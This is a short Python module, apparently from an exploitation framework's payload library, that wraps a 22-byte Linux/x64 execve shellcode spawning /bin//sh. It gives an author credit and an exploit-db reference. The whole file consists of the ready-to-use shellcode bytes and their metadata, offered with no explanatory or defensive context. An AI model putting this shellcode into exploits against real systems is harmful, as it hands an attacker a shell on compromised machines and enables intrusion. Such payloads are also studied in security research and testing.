from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "d4sh&r"
    Shellcode.info["name"] = "Linux/x64 - execve shellcode"
    Shellcode.info["references"] = [
        "https://www.exploit-db.com/exploits/38239/"
    ]
    Shellcode.info["size"] = 22
    Shellcode.info["payload"] = [
        r"\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e"
        r"\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24"
        r"\xb0\x3b\x0f\x05"

    ]
